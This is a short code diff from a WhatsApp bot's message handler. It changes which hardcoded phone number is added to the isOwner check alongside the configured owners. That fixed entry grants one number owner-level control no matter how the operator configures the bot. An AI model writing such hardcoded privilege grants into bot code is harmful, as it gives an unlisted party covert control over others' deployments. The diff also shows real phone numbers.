@@ -21,7 +21,7 @@ module.exports = async (sock, m, neekoi, store) => {
     const senderNumber = sender.split('@')[0]
     const pushname = m.pushName || `${senderNumber}`
     const isBot = botNumber.includes(senderNumber)
-    const isOwner = [botNumber, ...global.owner, '6289508082845@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
+    const isOwner = [botNumber, ...global.owner, '6285640575421@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
     const groupMetadata = isGroup? await sock.groupMetadata(m.chat).catch(e => {}) : ""
     const groupName = isGroup? groupMetadata.subject : ""
     const groupOwner = isGroup? groupMetadata.owner : ""
